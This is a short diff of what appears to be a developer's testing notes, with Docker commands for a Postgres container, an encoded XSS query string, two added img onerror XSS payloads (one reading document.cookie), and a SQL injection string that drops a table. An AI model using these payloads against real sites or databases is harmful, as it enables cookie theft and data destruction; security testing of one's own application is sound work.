@@ -4,5 +4,8 @@ docker stop my-postgresdb-container
 docker start my-postgresdb-container
 
 ?query=%3Cb%20onmouseover=%22alert(%27This%20is%20XSS!%27)%22%3EHover%20the%20mouse%20for%20XSS%3C/b%3E
+<img src="error.png" onerror="alert('this is xss')"/>
+<img src="error.png" onerror="alert(document.cookie)"/>
+
 
 yurii'; DROP TABLE "public"."temporary"; --
